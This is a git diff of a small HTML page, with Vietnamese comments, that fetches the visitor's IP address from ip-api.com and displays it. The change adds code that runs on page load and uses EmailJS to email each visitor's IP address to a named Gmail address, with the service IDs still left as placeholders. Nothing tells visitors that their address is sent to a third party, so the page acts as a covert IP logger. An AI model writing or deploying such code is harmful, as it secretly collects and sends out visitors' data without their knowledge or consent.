@@ -56,41 +56,26 @@
     </div>
 
     <script>
-        // Sử dụng API của ip-api để lấy địa chỉ IP
-        fetch('http://ip-api.com/json')
-            .then(response => response.json())
-            .then(data => {
-                const ipAddress = data.query; // Lấy địa chỉ IP từ phản hồi
-                document.getElementById('ip-address').textContent = ipAddress + " █"; // Thêm con trỏ nhấp nháy
-            })
-            .catch(error => {
-                console.error('Lỗi khi lấy địa chỉ IP:', error);
-                document.getElementById('ip-address').textContent = 'Không thể lấy địa chỉ IP. █';
-            });
+       fetch('https://ip-api.com/json')
+    .then(response => response.json())
+    .then(data => {
+        const ipAddress = data.query; // Lấy địa chỉ IP từ phản hồi
+        document.getElementById('ip-address').textContent = ipAddress + " █"; // Hiển thị IP
+
+        // Gửi email
+        emailjs.init('YOUR_USER_ID'); // Thay YOUR_USER_ID bằng ID thực tế của bạn
+        emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', { // Thay các giá trị placeholder bằng giá trị thực tế
+            to_email: 'stronggwall04@gmail.com',
+            ip_address: ipAddress
+        })
+        .then(response => console.log('Email đã được gửi!', response))
+        .catch(error => console.error('Lỗi khi gửi email:', error));
+    })
+    .catch(error => {
+        console.error('Lỗi khi lấy địa chỉ IP:', error);
+        document.getElementById('ip-address').textContent = 'Không thể lấy địa chỉ IP. █';
+    });
     </script>
 </body>
 </html>
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-    // Khởi tạo EmailJS
-    emailjs.init('YOUR_USER_ID');
-
-    fetch('http://ip-api.com/json')
-        .then(response => response.json())
-        .then(data => {
-            const ipAddress = data.query; // Lấy địa chỉ IP từ phản hồi
-            document.getElementById('ip-address').textContent = ipAddress + " █"; // Hiển thị IP
-
-            // Gửi email
-            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
-                to_email: 'stronggwall04@gmail.com',
-                ip_address: ipAddress
-            })
-            .then(response => console.log('Email đã được gửi!', response))
-            .catch(error => console.error('Lỗi khi gửi email:', error));
-        })
-        .catch(error => {
-            console.error('Lỗi khi lấy địa chỉ IP:', error);
-            document.getElementById('ip-address').textContent = 'Không thể lấy địa chỉ IP. █';
-        });
-</script>
